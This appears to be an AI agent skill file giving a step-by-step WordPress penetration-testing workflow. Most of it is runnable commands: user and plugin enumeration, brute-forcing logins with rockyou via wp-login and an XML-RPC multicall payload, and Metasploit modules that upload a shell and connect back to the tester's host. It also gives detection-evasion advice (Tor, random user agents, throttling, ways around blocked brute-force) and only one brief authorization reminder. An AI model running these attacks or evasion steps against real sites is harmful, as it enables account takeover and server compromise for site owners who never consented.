---
name: wordpress-penetration-testing
description: Use this skill when you need to conduct security assessments on WordPress installations, including vulnerability scanning, user enumeration, and exploitation techniques.
---

# WordPress Penetration Testing

## Purpose

Conduct comprehensive security assessments of WordPress installations including enumeration of users, themes, and plugins, vulnerability scanning, credential attacks, and exploitation techniques. WordPress powers approximately 35% of websites, making it a critical target for security testing.

## Prerequisites

### Required Tools
- WPScan (pre-installed in Kali Linux)
- Metasploit Framework
- Burp Suite or OWASP ZAP
- Nmap for initial discovery
- cURL or wget

### Required Knowledge
- WordPress architecture and structure
- Web application testing fundamentals
- HTTP protocol understanding
- Common web vulnerabilities (OWASP Top 10)

## Outputs and Deliverables

1. **WordPress Enumeration Report** - Version, themes, plugins, users
2. **Vulnerability Assessment** - Identified CVEs and misconfigurations
3. **Credential Assessment** - Weak password findings
4. **Exploitation Proof** - Shell access documentation

## Core Workflow

### Phase 1: WordPress Discovery

Identify WordPress installations:

```bash
# Check for WordPress indicators
curl -s http://<target_url> | grep -i wordpress
curl -s http://<target_url> | grep -i "wp-content"
curl -s http://<target_url> | grep -i "wp-includes"

# Check common WordPress paths
curl -I http://<target_url>/wp-login.php
curl -I http://<target_url>/wp-admin/
curl -I http://<target_url>/wp-content/
curl -I http://<target_url>/xmlrpc.php

# Check meta generator tag
curl -s http://<target_url> | grep "generator"

# Nmap WordPress detection
nmap -p 80,443 --script http-wordpress-enum <target_url>
```

Key WordPress files and directories:
- `/wp-admin/` - Admin dashboard
- `/wp-login.php` - Login page
- `/wp-content/` - Themes, plugins, uploads
- `/wp-includes/` - Core files
- `/xmlrpc.php` - XML-RPC interface
- `/wp-config.php` - Configuration (not accessible if secure)
- `/readme.html` - Version information

### Phase 2: Basic WPScan Enumeration

Comprehensive WordPress scanning with WPScan:

```bash
# Basic scan
wpscan --url http://<target_url>/wordpress/

# With API token (for vulnerability data)
wpscan --url http://<target_url> --api-token <YOUR_API_TOKEN>

# Aggressive detection mode
wpscan --url http://<target_url> --detection-mode aggressive

# Output to file
wpscan --url http://<target_url> -o results.txt

# JSON output
wpscan --url http://<target_url> -f json -o results.json

# Verbose output
wpscan --url http://<target_url> -v
```

### Phase 3: WordPress Version Detection

Identify WordPress version:

```bash
# WPScan version detection
wpscan --url http://<target_url>

# Manual version checks
curl -s http://<target_url>/readme.html | grep -i version
curl -s http://<target_url>/feed/ | grep -i generator
curl -s http://<target_url> | grep "?ver="

# Check meta generator
curl -s http://<target_url> | grep 'name="generator"'

# Check RSS feeds
curl -s http://<target_url>/feed/
curl -s http://<target_url>/comments/feed/
```

### Phase 4: Theme Enumeration

Identify installed themes:

```bash
# Enumerate all themes
wpscan --url http://<target_url> -e at

# Enumerate vulnerable themes only
wpscan --url http://<target_url> -e vt

# Theme enumeration with detection mode
wpscan --url http://<target_url> -e at --plugins-detection aggressive

# Manual theme detection
curl -s http://<target_url> | grep "wp-content/themes/"
curl -s http://<target_url>/wp-content/themes/
```

### Phase 5: Plugin Enumeration

Identify installed plugins:

```bash
# Enumerate all plugins
wpscan --url http://<target_url> -e ap

# Enumerate vulnerable plugins only
wpscan --url http://<target_url> -e vp

# Aggressive plugin detection
wpscan --url http://<target_url> -e ap --plugins-detection aggressive

# Mixed detection mode
wpscan --url http://<target_url> -e ap --plugins-detection mixed

# Manual plugin discovery
curl -s http://<target_url> | grep "wp-content/plugins/"
curl -s http://<target_url>/wp-content/plugins/
```

### Phase 6: User Enumeration

Discover WordPress users:

```bash
# WPScan user enumeration
wpscan --url http://<target_url> -e u

# Enumerate specific number of users
wpscan --url http://<target_url> -e u1-100

# Author ID enumeration (manual)
for i in {1..20}; do
    curl -s "http://<target_url>/?author=$i" | grep -o 'author/[^/]*/'
done

# JSON API user enumeration (if enabled)
curl -s http://<target_url>/wp-json/wp/v2/users

# REST API user enumeration
curl -s http://<target_url>/wp-json/wp/v2/users?per_page=100

# Login error enumeration
curl -X POST -d "log=admin&pwd=wrongpass" http://<target_url>/wp-login.php
```

### Phase 7: Comprehensive Enumeration

Run all enumeration modules:

```bash
# Enumerate everything
wpscan --url http://<target_url> -e at -e ap -e u

# Alternative comprehensive scan
wpscan --url http://<target_url> -e vp,vt,u,cb,dbe

# Full aggressive enumeration
wpscan --url http://<target_url> -e at,ap,u,cb,dbe \
    --detection-mode aggressive \
    --plugins-detection aggressive
```

### Phase 8: Password Attacks

Brute-force WordPress credentials:

```bash
# Single user brute-force
wpscan --url http://<target_url> -U admin -P /usr/share/wordlists/rockyou.txt

# Multiple users from file
wpscan --url http://<target_url> -U users.txt -P /usr/share/wordlists/rockyou.txt

# With password attack threads
wpscan --url http://<target_url> -U admin -P passwords.txt --password-attack wp-login -t 50

# XML-RPC brute-force (faster, may bypass protection)
wpscan --url http://<target_url> -U admin -P passwords.txt --password-attack xmlrpc

# Brute-force with API limiting
wpscan --url http://<target_url> -U admin -P passwords.txt --throttle 500

# Create targeted wordlist
cewl http://<target_url> -w wordlist.txt
wpscan --url http://<target_url> -U admin -P wordlist.txt
```

### Phase 9: Vulnerability Exploitation

#### Metasploit Shell Upload

After obtaining credentials:

```bash
# Start Metasploit
msfconsole

# Admin shell upload
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS <target_url>
set USERNAME admin
set PASSWORD <password>
set TARGETURI /wordpress
set LHOST <your_ip>
exploit
```

#### Plugin Exploitation

```bash
# Slideshow Gallery exploit
use exploit/unix/webapp/wp_slideshowgallery_upload
set RHOSTS <target_url>
set TARGETURI /wordpress
set USERNAME admin
set PASSWORD <password>
set LHOST <your_ip>
exploit
```

### Phase 10: Advanced Techniques

#### XML-RPC Exploitation

```bash
# Check if XML-RPC is enabled
curl -X POST http://<target_url>/xmlrpc.php

# List available methods
curl -X POST -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' http://<target_url>/xmlrpc.php

# Brute-force via XML-RPC multicall
cat > xmlrpc_brute.xml << 'EOF'
<?xml version="1.0"?>
<methodCall>
<methodName>system.multicall</methodName>
<params>
<param><value><array><data>
<value><struct>
<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
<member><name>params</name><value><array><data>
<value><string>admin</string></value>
<value><string>password1</string></value>
</data></array></value></member>
</struct></value>
<value><struct>
<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
<member><name>params</name><value><array><data>
<value><string>admin</string></value>
<value><string>password2</string></value>
</data></array></value></member>
</struct></value>
</data></array></value></param>
</params>
</methodCall>
EOF

curl -X POST -d @xmlrpc_brute.xml http://<target_url>/xmlrpc.php
```

#### Scanning Through Proxy

```bash
# Use Tor proxy
wpscan --url http://<target_url> --proxy socks5://127.0.0.1:9050

# HTTP proxy
wpscan --url http://<target_url> --proxy http://127.0.0.1:8080

# Burp Suite proxy
wpscan --url http://<target_url> --proxy http://127.0.0.1:8080 --disable-tls-checks
```

#### HTTP Authentication

```bash
# Basic authentication
wpscan --url http://<target_url> --http-auth admin:<password>

# Force SSL/TLS
wpscan --url https://<target_url> --disable-tls-checks
```

## Quick Reference

### WPScan Enumeration Flags

| Flag | Description |
|------|-------------|
| `-e at` | All themes |
| `-e vt` | Vulnerable themes |
| `-e ap` | All plugins |
| `-e vp` | Vulnerable plugins |
| `-e u` | Users (1-10) |
| `-e cb` | Config backups |
| `-e dbe` | Database exports |

### Common WordPress Paths

| Path | Purpose |
|------|---------|
| `/wp-admin/` | Admin dashboard |
| `/wp-login.php` | Login page |
| `/wp-content/uploads/` | User uploads |
| `/wp-includes/` | Core files |
| `/xmlrpc.php` | XML-RPC API |
| `/wp-json/` | REST API |

### WPScan Command Examples

| Purpose | Command |
|---------|---------|
| Basic scan | `wpscan --url http://<target_url>` |
| All enumeration | `wpscan --url http://<target_url> -e at,ap,u` |
| Password attack | `wpscan --url http://<target_url> -U admin -P pass.txt` |
| Aggressive | `wpscan --url http://<target_url> --detection-mode aggressive` |

## Constraints and Limitations

### Legal Considerations
- Obtain written authorization before testing
- Stay within defined scope
- Document all testing activities
- Follow responsible disclosure

### Technical Limitations
- WAF may block scanning
- Rate limiting may prevent brute-force
- Some plugins may have false negatives
- XML-RPC may be disabled

### Detection Evasion
- Use random user agents: `--random-user-agent`
- Throttle requests: `--throttle 1000`
- Use proxy rotation
- Avoid aggressive modes on monitored sites

## Troubleshooting

### WPScan Shows No Vulnerabilities

**Solutions:**
1. Use API token for vulnerability database
2. Try aggressive detection mode
3. Check for WAF blocking scans
4. Verify WordPress is actually installed

### Brute-Force Blocked

**Solutions:**
1. Use XML-RPC method instead of wp-login
2. Add throttling: `--throttle 500`
3. Use different user agents
4. Check for IP blocking/fail2ban

### Cannot Access Admin Panel

**Solutions:**
1. Verify credentials are correct
2. Check for two-factor authentication
3. Look for IP whitelist restrictions
4. Check for login URL changes (security plugins)